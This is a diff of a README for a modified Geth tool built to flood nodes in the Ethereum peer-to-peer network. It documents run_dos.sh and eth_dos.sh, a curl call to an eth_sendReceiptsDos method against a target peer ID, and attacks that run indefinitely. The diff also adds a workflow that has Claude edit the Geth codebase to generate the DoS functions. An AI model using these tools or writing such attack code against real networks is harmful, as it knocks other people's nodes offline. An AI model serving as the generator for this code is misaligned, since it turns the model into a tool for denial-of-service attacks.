@@ -1,11 +1,37 @@
-# Ethereum message-flooding DoS attack against arbitrary nodes in the P2P network
+# Automated Generation of DOS Functions in Geth Using Claude
+
+This project includes an automated workflow that uses Claude to read, analyze, and modify the Geth codebase, generating the required DOS-related functions.  
+Before running the automation pipeline, you must first export your Anthropic API key:
+
+```export ANTHROPIC_API_KEY="your_api_key_here"```
+
+
+After setting the environment variable, run the automated code-generation loop with:
+
+
+
+```
+python3 auto_prompt.py \
+  --project ./ \
+  --task-prompt ./init_prompt.md \
+  --test-cmd "./test.sh" \
+  --max-iterations 5
+
+```
+
+
+
+
+
+
+### Ethereum message-flooding DoS attack against arbitrary nodes in the P2P network
 
 There are two ways to start the message-flooding DoS attack:
 
 1. **eth_dos.sh** - Start the Ethereum protocol DoS attacks via JSON-RPC API
 2. **run_dos.sh** - Start protocol-level DoS attacks across multiple layers
 
-## Command-Line DoS Script (run_dos.sh)
+### Command-Line DoS Script (run_dos.sh)
 
 The `run_dos.sh` script provides comprehensive DoS attack capabilities across multiple Ethereum protocol layers. This is a direct protocol attack tool that bypasses RPC and communicates directly with target nodes.
 
@@ -154,7 +180,7 @@ HTTP RPC endpoint attacks:
 - **Attack Duration**: All attacks run indefinitely until stopped with Ctrl+C
 - **Resource Impact**: Monitor system resources during testing
 
-## RPC-Based DoS APIs (eth_dos.sh)
+### RPC-Based DoS APIs (eth_dos.sh)
 
 Starting Nodes
 Before using the APIs, you need to start one or more Ethereum nodes using the startNode.sh script.
@@ -184,13 +210,13 @@ Node data: ${BASE_PATH}/ddos${node_num}/ethereum/data
 JWT secret: ${BASE_PATH}/ddos${node_num}/jwt.hex
 Example for starting multiple nodes:
 
-# Start the first node
+### Start the first node
 ./startNode.sh node1
 
-# Start the second node
+### Start the second node
 ./startNode.sh node2
 
-# Start the third node
+### Start the third node
 ./startNode.sh node3
 Configuration
 Before using the APIs, you need to configure your environment:
@@ -303,16 +329,16 @@ Hashes.txt: Required for APIs that use random hashes from this file
 Example Usage
 Here's a complete example of how to use the Send Receipts DoS API:
 
-# Replace with your target peer ID
+### Replace with your target peer ID
 PEER_ID="8fdaa258d434f6e9f1cfed5e6169931f86eade403aa42d6f6f47862041143ab5"
 
-# Replace with your geth node's RPC endpoint
+### Replace with your geth node's RPC endpoint
 RPC_URL="http://localhost:10545"
 
-# Using the shell script
+### Using the shell script
 ./dos.sh sendReceiptsDos
 
-# Or using curl directly
+### Or using curl directly
 curl -X POST -H "Content-Type: application/json" --data '{
 "jsonrpc":"2.0",
 "method":"eth_sendReceiptsDos",
@@ -325,4 +351,5 @@ Single Attack Node
 Continuous attack is possible; testing duration: 2 hours.
 
 Double Attack Node After modification, One of the nodes can continue the attack, while the other node stops immediately.
+
 
